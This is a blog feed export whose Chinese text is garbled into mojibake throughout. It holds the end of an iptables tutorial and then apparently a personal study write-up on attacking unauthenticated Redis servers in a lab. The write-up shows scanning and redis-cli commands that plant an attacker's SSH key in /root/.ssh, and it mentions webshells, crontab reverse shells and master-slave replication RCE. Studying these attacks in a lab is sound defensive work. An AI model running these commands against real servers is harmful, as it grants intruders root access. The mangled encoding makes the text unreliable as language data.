‡åœ°å€éƒ½ä¸ºanywhereï¼Œçœ‹æ¥ï¼Œiptablesé»˜è®¤ä¸ºæˆ‘ä»¬è¿›è¡Œäº†åç§°è§£æï¼Œä½†æ˜¯åœ¨è§„åˆ™éå¸¸å¤šçš„æƒ…å†µä¸‹å¦‚æœè¿›è¡Œåç§°è§£æï¼Œæ•ˆç‡ä¼šæ¯”è¾ƒä½ï¼Œæ‰€ä»¥ï¼Œåœ¨æ²¡æœ‰æ­¤éœ€æ±‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨-né€‰é¡¹ï¼Œè¡¨ç¤ºä¸å¯¹IPåœ°å€è¿›è¡Œåç§°åè§£ï¼Œç›´æ¥æ˜¾ç¤ºIPåœ°å€</strong>ï¼Œç¤ºä¾‹å¦‚ä¸‹ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -nvL</span><br></pre></td></tr></table></figure><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_4.png"></p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œè§„åˆ™ä¸­çš„æºåœ°å€ä¸ç›®æ ‡åœ°å€å·²ç»æ˜¾ç¤ºä¸ºIPï¼Œè€Œéè½¬æ¢åçš„åç§°ã€‚</p><p>ä½¿ç”¨<code>--line-numbers</code> å³å¯æ˜¾ç¤ºè§„åˆ™çš„ç¼–å·</p><p><img src="http://www.zsythink.net/wp-content/uploads/2017/04/041317_0547_5.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200826224157.png" alt="image-20200826224155655"></p><p>å¦‚å›¾ï¼Œæ¯ä¸ªé“¾çš„åé¢éƒ½æœ‰ä¸€ä¸ªæ‹¬å·ï¼Œæ‹¬å·åé¢æœ‰ä¸€äº›ä¿¡æ¯ï¼š</p><p><strong>policy</strong>è¡¨ç¤ºå½“å‰é“¾çš„é»˜è®¤ç­–ç•¥ï¼Œpolicy ACCEPTè¡¨ç¤ºä¸Šå›¾ä¸­INPUTçš„é“¾çš„é»˜è®¤åŠ¨ä½œä¸ºACCEPT</p><p><strong>packets</strong>è¡¨ç¤ºå½“å‰é“¾ï¼ˆä¸Šä¾‹ä¸ºINPUTé“¾ï¼‰é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„åŒ…çš„æ•°é‡ï¼Œ0 packetsè¡¨ç¤ºé»˜è®¤ç­–ç•¥åŒ¹é…åˆ°0ä¸ªåŒ…ã€‚</p><p><strong>bytes</strong>è¡¨ç¤ºå½“å‰é“¾é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æ‰€æœ‰åŒ…çš„å¤§å°æ€»å’Œã€‚</p><p>å…¶å®ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠpacketsä¸bytesç§°ä½œâ€è®¡æ•°å™¨â€ï¼Œä¸Šå›¾ä¸­çš„è®¡æ•°å™¨è®°å½•äº†é»˜è®¤ç­–ç•¥åŒ¹é…åˆ°çš„æŠ¥æ–‡æ•°é‡ä¸æ€»å¤§å°ï¼Œâ€è®¡æ•°å™¨â€åªä¼šåœ¨ä½¿ç”¨-vé€‰é¡¹æ—¶ï¼Œæ‰ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p><p>å¦‚æœè¦æŸ¥çœ‹æ›´ç²¾ç¡®çš„è®¡æ•°å€¼ï¼Œå¯ä»¥ä½¿ç”¨<code>-x</code>é€‰é¡¹ã€‚</p><h1 id="Iptables-è§„åˆ™ç®¡ç†"><a href="#Iptables-è§„åˆ™ç®¡ç†" class="headerlink" title="Iptables è§„åˆ™ç®¡ç†"></a>Iptables è§„åˆ™ç®¡ç†</h1><p><a href="http://www.zsythink.net/archives/1517">http://www.zsythink.net/archives/1517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š &lt;/p&gt;
&lt;p&gt;(å†…å®¹å’Œå›¾ç‰‡)&lt;/p&gt;
&lt;p&gt;å…¨æ•™ç¨‹ç³»åˆ—&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.zsythink.net/archives/tag/iptables/&quot;&gt;iptables å…¥é—¨ç³»åˆ—&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="è¿ç»´çŸ¥è¯†" scheme="https://hack-for.fun/categories/%E8%BF%90%E7%BB%B4%E7%9F%A5%E8%AF%86/"/>
    
    
    <category term="iptables" scheme="https://hack-for.fun/tags/iptables/"/>
    
  </entry>
  
  <entry>
    <title>Redis å®‰å…¨å­¦ä¹ ç¬”è®°</title>
    <link href="https://hack-for.fun/c10c5ca9.html"/>
    <id>https://hack-for.fun/c10c5ca9.html</id>
    <published>2020-06-27T01:58:53.000Z</published>
    <updated>2020-10-30T12:57:36.958Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘æ”¾å‡ºæ¥çš„æ–‡ç« éƒ½æ˜¯ä»¥å‰æ—©å°±æ€»ç»“å¥½çš„äº†ã€‚</p><h1 id="Redis-å®‰å…¨å­¦ä¹ ç¬”è®°"><a href="#Redis-å®‰å…¨å­¦ä¹ ç¬”è®°" class="headerlink" title="Redis å®‰å…¨å­¦ä¹ ç¬”è®°"></a>Redis å®‰å…¨å­¦ä¹ ç¬”è®°</h1><p><a href="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ"><img src="https://hackmd.io/3Rcm9yEeQQuwzbH6_RoeOQ/badge" alt="hackmd-github-sync-badge"></a></p><p>[TOC]</p><p>å®æˆ˜ç¯å¢ƒä¸‹ï¼Œæ„Ÿè§‰Redis æœªæˆæƒéå¸¸å¸¸è§ï¼Œè€Œæˆ‘ä¹‹å‰åªçŸ¥é“æ€ä¹ˆåˆ©ç”¨åˆ«äººçš„å†™å¥½çš„å·¥å…·å»è§£CTFï¼Œæ²¡æœ‰å»ç ”ç©¶è¿‡åŸç†ï¼Œé‚åœ¨ç«¯åˆèŠ‚æ¥ç ”ç©¶ä¸€æ³¢ï¼</p><h2 id="Redis-ä»‹ç»"><a href="#Redis-ä»‹ç»" class="headerlink" title="Redis ä»‹ç»"></a>Redis ä»‹ç»</h2><p>Redisæ˜¯ä¸€ä¸ªå¼€æºçš„ä½¿ç”¨ANSI Cè¯­è¨€ç¼–å†™ã€æ”¯æŒç½‘ç»œã€å¯åŸºäºå†…å­˜äº¦å¯æŒä¹…åŒ–çš„æ—¥å¿—å‹ã€ Key-Valueæ•°æ®åº“ã€‚å’ŒMemcachedç±»ä¼¼ï¼Œå®ƒæ”¯æŒå­˜å‚¨çš„value ç±»å‹ç›¸å¯¹æ›´å¤šï¼ŒåŒ…æ‹¬ string(å­—ç¬¦ä¸²)ã€list ( é“¾è¡¨)ã€ set(é›†åˆ)ã€zset(sorted set â€“ æœ‰åºé›†åˆ)å’Œ hashï¼ˆå“ˆå¸Œç±»å‹ï¼‰ã€‚è¿™äº›æ•°æ®ç±»å‹éƒ½æ”¯æŒpush/pop ã€ add/remove åŠå–äº¤é›†å¹¶é›†å’Œå·®é›†åŠæ›´ä¸°å¯Œçš„æ“ä½œï¼Œè€Œä¸”è¿™äº›æ“ä½œéƒ½æ˜¯åŸå­æ€§çš„ã€‚åœ¨æ­¤åŸºç¡€ä¸Šï¼Œ redisæ”¯æŒå„ç§ä¸åŒæ–¹å¼çš„æ’åºã€‚ä¸ memcached ä¸€æ ·ï¼Œä¸ºäº†ä¿è¯æ•ˆç‡ï¼Œæ•°æ®éƒ½æ˜¯ç¼“å­˜åœ¨å†…å­˜ä¸­ã€‚åŒºåˆ«çš„æ˜¯ redis ä¼šå‘¨æœŸæ€§çš„æŠŠæ›´æ–°çš„æ•°æ®å†™å…¥ç£ç›˜æˆ–è€…æŠŠä¿®æ”¹æ“ä½œå†™å…¥è¿½åŠ çš„è®°å½•æ–‡ä»¶ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šå®ç°äº† master-slave ( ä¸»ä»)åŒæ­¥ã€‚</p><blockquote><p>Redis ä¸‹è½½åœ°å€ï¼š<a href="http://download.redis.io/releases/">http://download.redis.io/releases/</a></p></blockquote><h2 id="RESP-åè®®ä»‹ç»"><a href="#RESP-åè®®ä»‹ç»" class="headerlink" title="RESP åè®®ä»‹ç»"></a>RESP åè®®ä»‹ç»</h2><p>RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚<br>RESPåè®®æ˜¯åœ¨Redis 1.2ä¸­å¼•å…¥çš„ï¼Œä½†å®ƒæˆä¸ºäº†ä¸Redis 2.0ä¸­çš„RedisæœåŠ¡å™¨é€šä¿¡çš„æ ‡å‡†æ–¹å¼ã€‚è¿™æ˜¯æ‚¨åº”è¯¥åœ¨Rediså®¢æˆ·ç«¯ä¸­å®ç°çš„åè®®ã€‚<br>RESPå®é™…ä¸Šæ˜¯ä¸€ä¸ªæ”¯æŒä»¥ä¸‹æ•°æ®ç±»å‹çš„åºåˆ—åŒ–åè®®ï¼šç®€å•å­—ç¬¦ä¸²ï¼Œé”™è¯¯ï¼Œæ•´æ•°ï¼Œæ‰¹é‡å­—ç¬¦ä¸²å’Œæ•°ç»„ã€‚</p><p>RESPåœ¨Redisä¸­ç”¨ä½œè¯·æ±‚ - å“åº”åè®®çš„æ–¹å¼å¦‚ä¸‹ï¼š</p><p>å®¢æˆ·ç«¯å°†å‘½ä»¤ä½œä¸ºBulk Stringsçš„RESPæ•°ç»„å‘é€åˆ°RedisæœåŠ¡å™¨ã€‚<br>æœåŠ¡å™¨æ ¹æ®å‘½ä»¤å®ç°å›å¤ä¸€ç§RESPç±»å‹ã€‚<br>åœ¨RESPä¸­ï¼ŒæŸäº›æ•°æ®çš„ç±»å‹å–å†³äºç¬¬ä¸€ä¸ªå­—èŠ‚ï¼š<br>å¯¹äºSimple Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯+<br>å¯¹äºerrorï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯-<br>å¯¹äºIntegerï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯:<br>å¯¹äºBulk Stringsï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯$<br>å¯¹äºarrayï¼Œå›å¤çš„ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯*<br>æ­¤å¤–ï¼ŒRESPèƒ½å¤Ÿä½¿ç”¨ç¨åæŒ‡å®šçš„Bulk Stringsæˆ–Arrayçš„ç‰¹æ®Šå˜ä½“æ¥è¡¨ç¤ºNullå€¼ã€‚<br>åœ¨RESPä¸­ï¼Œåè®®çš„ä¸åŒéƒ¨åˆ†å§‹ç»ˆä»¥â€\r\nâ€(CRLF)ç»“æŸã€‚</p><p><a href="https://xz.aliyun.com/t/5665#toc-0">https://xz.aliyun.com/t/5665#toc-0</a></p><h2 id="æ¼æ´ä»‹ç»"><a href="#æ¼æ´ä»‹ç»" class="headerlink" title="æ¼æ´ä»‹ç»"></a>æ¼æ´ä»‹ç»</h2><h3 id="æœªæˆæƒæ¼æ´"><a href="#æœªæˆæƒæ¼æ´" class="headerlink" title="æœªæˆæƒæ¼æ´"></a>æœªæˆæƒæ¼æ´</h3><p>Redis é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œï¼Œå¦‚æœæ²¡æœ‰è¿›è¡Œé‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œè¿™æ ·å°†ä¼šå°† Redis æœåŠ¡æš´éœ²åˆ°å…¬ç½‘ä¸Šï¼Œå¦‚æœåœ¨æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰çš„æƒ…å†µä¸‹ï¼ˆé»˜è®¤é…ç½®ï¼‰ï¼Œä¼šå¯¼è‡´ä»»æ„ç”¨æˆ·åœ¨å¯ä»¥è®¿é—®ç›®æ ‡æœåŠ¡å™¨çš„æƒ…å†µä¸‹æœªæˆæƒè®¿é—® Redis ä»¥åŠè¯»å– Redis çš„æ•°æ®ã€‚æ”»å‡»è€…åœ¨æœªæˆæƒè®¿é—® Redis çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ Redis è‡ªèº«çš„æä¾›çš„config å‘½ä»¤ï¼Œå¯ä»¥è¿›è¡Œå†™æ–‡ä»¶æ“ä½œï¼Œæ”»å‡»è€…å¯ä»¥æˆåŠŸå°†è‡ªå·±çš„sshå…¬é’¥å†™å…¥ç›®æ ‡æœåŠ¡å™¨çš„ /root/.ssh æ–‡ä»¶å¤¹çš„authotrized_keys æ–‡ä»¶ä¸­ï¼Œè¿›è€Œå¯ä»¥ä½¿ç”¨å¯¹åº”ç§é’¥ç›´æ¥ä½¿ç”¨sshæœåŠ¡ç™»å½•ç›®æ ‡æœåŠ¡å™¨ã€‚</p><p>Rediså› é…ç½®ä¸å½“å¯ä»¥å¯¼è‡´æœªæˆæƒè®¿é—®ï¼Œè¢«æ”»å‡»è€…æ¶æ„åˆ©ç”¨ã€‚å½“å‰æµè¡Œçš„é’ˆå¯¹Redisæœªæˆæƒè®¿é—®çš„ä¸€ç§æ–°å‹æ”»å‡»æ–¹å¼ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ï¼Œå¦‚æœRedisä»¥rootèº«ä»½è¿è¡Œï¼Œé»‘å®¢å¯ä»¥ç»™rootè´¦æˆ·å†™å…¥SSHå…¬é’¥æ–‡ä»¶ï¼Œç›´æ¥é€šè¿‡SSHç™»å½•å—å®³æœåŠ¡å™¨ï¼Œå¯å¯¼è‡´æœåŠ¡å™¨æƒé™è¢«è·å–å’Œæ•°æ®åˆ é™¤ã€æ³„éœ²æˆ–åŠ å¯†å‹’ç´¢äº‹ä»¶å‘ç”Ÿï¼Œä¸¥é‡å±å®³ä¸šåŠ¡æ­£å¸¸æœåŠ¡ã€‚ã€€ã€€éƒ¨åˆ†æœåŠ¡å™¨ä¸Šçš„Redis ç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œå¹¶ä¸”æ²¡æœ‰å¼€å¯è®¤è¯ï¼ˆè¿™æ˜¯Redis çš„é»˜è®¤é…ç½®ï¼‰ï¼Œä»¥åŠè¯¥ç«¯å£å¯ä»¥é€šè¿‡å…¬ç½‘ç›´æ¥è®¿é—®ï¼Œå¦‚æœæ²¡æœ‰é‡‡ç”¨ç›¸å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ï¼Œå°†ä¼šå¯¼è‡´ Redis æœåŠ¡ç›´æ¥æš´éœ²åœ¨å…¬ç½‘ä¸Šï¼Œå¯èƒ½é€ æˆå…¶ä»–ç”¨æˆ·å¯ä»¥ç›´æ¥åœ¨éæˆæƒæƒ…å†µä¸‹ç›´æ¥è®¿é—®RedisæœåŠ¡å¹¶è¿›è¡Œç›¸å…³æ“ä½œã€‚ã€€ã€€ç›®å‰æ¯”è¾ƒä¸»æµçš„æ¡ˆä¾‹ï¼šyam2 minerd æŒ–çŸ¿ç¨‹åºï¼Œè¿˜æœ‰åœ¨å¤šæ¬¡åº”æ€¥äº‹ä»¶ä¸­å‘ç°å¤§é‡çš„watch-smartdæŒ–çŸ¿æœ¨é©¬ã€‚</p><p>ç®€å•è¯´ï¼Œæ¼æ´çš„äº§ç”Ÿæ¡ä»¶æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><p>ï¼ˆ1ï¼‰redisç»‘å®šåœ¨ 0.0.0.0:6379ï¼Œä¸”æ²¡æœ‰è¿›è¡Œæ·»åŠ é˜²ç«å¢™è§„åˆ™é¿å…å…¶ä»–éä¿¡ä»»æ¥æº ip è®¿é—®ç­‰ç›¸å…³å®‰å…¨ç­–ç•¥ï¼Œç›´æ¥æš´éœ²åœ¨å…¬ç½‘ï¼›</p><p>ï¼ˆ2ï¼‰æ²¡æœ‰è®¾ç½®å¯†ç è®¤è¯ï¼ˆä¸€èˆ¬ä¸ºç©ºï¼‰ï¼Œå¯ä»¥å…å¯†ç è¿œç¨‹ç™»å½•redisæœåŠ¡ã€‚</p><p>(3) root èº«ä»½è¿è¡Œredis</p><p>ä¸»æµæ¡ˆä¾‹å›¾ç¤º<br>ä¸»æµæ¡ˆä¾‹å›¾ç¤º</p><p>å†™å…¬é’¥åªæ˜¯å…¶ä¸­ä¸€ç§ï¼Œè¿˜å¯ä»¥å†™webshell ï¼Œcrontab åå¼¹shellï¼Œæ¥getshellã€‚<br><img src="https://i.imgur.com/p9JFoqk.png"></p><p>ä»¥åŠå…¶ä»–æ¼æ´åœºæ™¯ï¼Œä¸‹é¢é€ä¸€ä»‹ç»å’Œå¤ç°ã€‚</p><h3 id="ä¸»ä»å¤åˆ¶-RCE"><a href="#ä¸»ä»å¤åˆ¶-RCE" class="headerlink" title="ä¸»ä»å¤åˆ¶ RCE"></a>ä¸»ä»å¤åˆ¶ RCE</h3><p>Redisä¸»ä»å¤åˆ¶ä»‹ç»<br>Redisæ˜¯ä¸€ä¸ªä½¿ç”¨ANSI Cç¼–å†™çš„å¼€æºã€æ”¯æŒç½‘ç»œã€åŸºäºå†…å­˜ã€å¯é€‰æŒä¹…æ€§çš„é”®å€¼å¯¹å­˜å‚¨æ•°æ®åº“ã€‚ä½†å¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p><p>æ¼æ´å‡ºç°çš„èƒŒæ™¯<br>éšç€ç°ä»£çš„æœåŠ¡éƒ¨ç½²æ–¹å¼çš„ä¸æ–­å‘å±•ï¼Œç»„ä»¶åŒ–æˆäº†ä¸å¯é€ƒé¿çš„å¤§è¶‹åŠ¿ï¼Œdockerå°±æ˜¯è¿™è‚¡é£æ½®ä¸‹çš„äº§ç‰©ä¹‹ä¸€ï¼Œè€Œåœ¨è¿™ç§éƒ¨ç½²æ¨¡å¼ä¸‹ï¼Œä¸€ä¸ªå•ä¸€çš„å®¹å™¨ä¸­ä¸ä¼šæœ‰é™¤redisä»¥å¤–çš„ä»»ä½•æœåŠ¡å­˜åœ¨ï¼ŒåŒ…æ‹¬sshå’Œcrontabï¼Œå†åŠ ä¸Šæƒé™çš„ä¸¥æ ¼æ§åˆ¶ï¼Œåªé å†™æ–‡ä»¶å°±å¾ˆéš¾å†getshelläº†ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±éœ€è¦å…¶ä»–çš„åˆ©ç”¨æ‰‹æ®µäº†</p><p>æ¼æ´åŸç†<br>åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šã€‚</p><p>ç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><h3 id="å¤ç°å‡†å¤‡"><a href="#å¤ç°å‡†å¤‡" class="headerlink" title="å¤ç°å‡†å¤‡"></a>å¤ç°å‡†å¤‡</h3><p>å®‰è£…Redis</p><p>sudo apt-get update # æ›´æ–°apt åŒ…<br>sudo apt-get install redis-server # å®‰è£…Redis<br>service redis-server start # å¼€å¯Redis æœåŠ¡ï¼ˆ ç»è¿‡å¤ç°ï¼Œè¿™ç§æ¨¡å¼ä¸‹ï¼Œæ˜¯ä»¥redisèº«ä»½è¿è¡Œçš„redis æœåŠ¡<br>redis-cli # è¿›å…¥Redis å‘½ä»¤è¡Œæ¨¡å¼</p><p>å¤ç°ç¯å¢ƒ<br><img src="https://i.imgur.com/2VYBQlt.png"></p><p>ç½‘ç»œç¯å¢ƒï¼šNAT</p><p>æ”»å‡»æœºï¼šKali Linuxï¼š192.168.118.129</p><p>é¶æœºï¼šUbuntu 18.04 ï¼š192.168.118.142</p><p>Redis è¿æ¥å‘½ä»¤<br>redis-cli -h 127.0.0.1 -p 6379<br>è§£å†³Redis æ— æ³•è¿œç¨‹è¿æ¥ï¼š<a href="https://blog.csdn.net/qq_41507845/article/details/80967282">https://blog.csdn.net/qq_41507845/article/details/80967282</a></p><p>ä¿®æ”¹redis é…ç½®æ–‡ä»¶: Ubuntu åœ¨ /etc/redis/redis.conf</p><p>#bind 127.0.0.1<br>redisåœ¨å¼€æ”¾å¾€å¤–ç½‘çš„æƒ…å†µä¸‹(é»˜è®¤é…ç½®æ˜¯bind 127.0.0.1ï¼Œåªå…è®¸æœ¬åœ°è®¿é—®ï¼Œå¦‚æœé…ç½®äº†å…¶ä»–ç½‘å¡åœ°å€é‚£ä¹ˆå°±å¯ä»¥ç½‘ç»œè®¿é—®)ï¼Œé»˜è®¤é…ç½®ä¸‹æ˜¯ç©ºå£ä»¤ï¼Œç«¯å£ä¸º6379ã€‚</p><p>Protected-mode no<br>redis3.2ç‰ˆæœ¬åæ–°å¢protected-modeé…ç½®ï¼Œé»˜è®¤æ˜¯yesï¼Œå³å¼€å¯ã€‚è®¾ç½®å¤–éƒ¨ç½‘ç»œè¿æ¥redisæœåŠ¡ï¼Œè®¾ç½®æ–¹å¼å¦‚ä¸‹ï¼š<br>1ã€å…³é—­protected-modeæ¨¡å¼ï¼Œæ­¤æ—¶å¤–éƒ¨ç½‘ç»œå¯ä»¥ç›´æ¥è®¿é—®<br>2ã€å¼€å¯protected-modeä¿æŠ¤æ¨¡å¼ï¼Œéœ€é…ç½®bind ipæˆ–è€…è®¾ç½®è®¿é—®å¯†ç </p><h3 id="å¼€å§‹å¤ç°"><a href="#å¼€å§‹å¤ç°" class="headerlink" title="å¼€å§‹å¤ç°"></a>å¼€å§‹å¤ç°</h3><p>å¯¹é¶æœºè¿›è¡Œå…¨ç«¯å£æ‰«æï¼š<br><img src="https://i.imgur.com/OiedL9z.png"></p><p>å‘ç°å¯¹å¤–å¼€å¯6379 redis æœåŠ¡ã€‚è·å–redis è¯¦ç»†ä¿¡æ¯</p><p>nmap -A -p 6379 -script redis-info 192.168.118.142<br><img src="https://i.imgur.com/LVfNqbh.png"></p><p>å°è¯•è¿œç¨‹è¿æ¥å—å®³è€…redis æœåŠ¡ã€‚</p><p>redis-cli -h 192.168.118.142 -p 6379</p><p>æˆåŠŸè¿ä¸Šï¼Œæ‰§è¡Œå‘½ä»¤ping , å¦‚æœå›æ˜¾PONG åˆ™è¡¨ç¤ºè¿œç¨‹ç™»å½•æˆåŠŸã€‚</p><p>æ‰§è¡Œinfo å‘½ä»¤ï¼Œåœ¨redis 2.8 ä»¥åå¯ä»¥çœ‹åˆ°redis é…ç½®æ–‡ä»¶çš„ç‰©ç†è·¯å¾„ï¼š<br><img src="https://i.imgur.com/Ks7zBDv.png"></p><p>Ubuntu ä¸‹ä¸ºï¼š/etc/redis/redis.conf</p><p>CentOs ä¸‹ä¸ºï¼š/etc/redis.conf</p><p>åœºæ™¯ä¸€ï¼šåˆ©ç”¨redis å†™å…¥ssh key è¿œç¨‹ç™»å½•é¶æœºssh<br>åŸç†å°±æ˜¯åœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†æœ¬æœºçš„å…¬é’¥ä½œä¸ºvalueï¼Œkeyå€¼éšæ„ï¼Œç„¶åé€šè¿‡ä¿®æ”¹æ•°æ®åº“çš„é»˜è®¤è·¯å¾„ä¸º/root/.sshå’Œé»˜è®¤çš„ç¼“å†²æ–‡ä»¶authorized.keys,æŠŠç¼“å†²çš„æ•°æ®ä¿å­˜åœ¨æ–‡ä»¶é‡Œï¼Œè¿™æ ·å°±å¯ä»¥å†æœåŠ¡å™¨ç«¯çš„/root/.sshä¸‹ç”Ÿä¸€ä¸ªæˆæƒçš„keyã€‚</p><p>æ¡ä»¶ï¼š</p><p>é¶æœºä»¥root èº«ä»½å¯åŠ¨redis æœåŠ¡<br>redis è®¤è¯æ— å¯†ç æˆ–è€…å¼±å£ä»¤<br>æœåŠ¡å™¨å¼€å¯sshæœåŠ¡ï¼Œå¹¶å…è®¸ä»¥å¯†é’¥ç™»å½• ï¼Œå¼€å¯ssh æœåŠ¡ï¼š<a href="https://blog.csdn.net/jackghq/article/details/54974141">https://blog.csdn.net/jackghq/article/details/54974141</a><br>æ”»å‡»æœºï¼š</p><p>ç”Ÿæˆssh key<br>ssh-keygen -t rsa<br><img src="https://i.imgur.com/V8qwFVy.png"></p><p>è¿™é‡Œä½¿ç”¨\n\n å‰åæ¢è¡Œï¼Œæ˜¯ä¸ºäº†é¿å…å’Œredis å…¶ä»–ç¼“å­˜çš„æ•°æ®æ··æ·†ã€‚</p><p>å°†ç”Ÿæˆçš„key.txt å†™å…¥é¶æœºçš„ç¼“å†²é‡Œ<br>cat /root/.ssh/key.txt | redis-cli -h 192.168.118.142 -x set evil_ssh_key</p><p>è¿™é‡Œå‡ºç°æŠ¥é”™ï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ç‰ˆæœ¬é—®é¢˜è¿˜æ˜¯æ‰§è¡Œçš„å‘½ä»¤æœ‰é—®é¢˜ï¼ŒGoogle è§£å†³ï¼š</p><p><a href="https://www.jianshu.com/p/3aaf21dd34d6">https://www.jianshu.com/p/3aaf21dd34d6</a></p><p>åŸå› ï¼šå¼ºåˆ¶å…³é—­redis å¿«ç…§å¯¼è‡´ä¸èƒ½æŒä¹…åŒ–ã€‚</p><p>åœ¨é¶æœºä¸Šredis æ‰§è¡Œï¼ˆæ‰€ä»¥æˆ‘æ„Ÿè§‰è¿™æ¬¡å¤ç°ç®—æ˜¯å¤±è´¥äº†ï¼Œå®é™…ç¯å¢ƒæ€ä¹ˆå¯èƒ½å‘¢ï¼Œ</p><p>127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no<br>å½“æˆ‘æ­£å‡†å¤‡å†™çš„æ—¶å€™ï¼Œå‘ç°permission deniedã€‚åŸå› ï¼šé¶æœºredis ä¸æ˜¯ä»¥root èº«ä»½è¿è¡Œï¼Œè¯´ä¸å®šä¸Šä¸€ä¸ªæŠ¥é”™ï¼ŒåŒæ ·ä¹Ÿæ˜¯è¿™ä¸ªåŸå› ã€‚</p><p>å°†permission deiedçš„é—®é¢˜å»æœç´¢ã€‚å‘ç°å·²æœ‰äººè¸©è¿‡å‘ã€‚</p><p><a href="https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/">https://airycanon.me/jie-jue-redis-de-getshell-yin-qi-de-bgsave-cuo-wu/</a></p><p><img src="https://i.imgur.com/o04V2rM.png"></p><p>æœç„¶ï¼ŒæŸ¥çœ‹è¿›ç¨‹å‘ç°ï¼Œredis ä¸æ˜¯ä»¥root èº«ä»½ç™»å½•çš„ã€‚è€Œä¸”ä¸Šé¢é‚£ä¸ªä¿®æ”¹ä¸ºnoï¼Œåªæ˜¯ä¸æŠ¥é”™ï¼Œé—®é¢˜å…¶å®ä¹Ÿå¹¶æ²¡æœ‰è§£å†³ã€‚è¿™é‡Œé€šè¿‡ä»¥rootæƒé™ä½¿ç”¨é…ç½®æ–‡ä»¶å¯åŠ¨redis-server å³å¯ã€‚ï¼ˆåŸå› æ˜¯é«˜ç‰ˆæœ¬redisï¼Œé»˜è®¤ä»¥redis èº«ä»½è¿è¡Œçš„</p><ol><li>è®¾ç½®redis å¤‡ä»½è·¯å¾„ä¸º/root/.ssh , è¿™æ ·å¯ä»¥å†™å…¥æˆ‘ä»¬çš„evil_ssh_key<br>config set dir /root/.ssh   # å¦‚æœæŠ¥é”™ï¼Œè¯´æ˜é¶æœºæ²¡æœ‰ç™»å½•è¿‡sshã€‚æ‰§è¡Œ ssh localhost 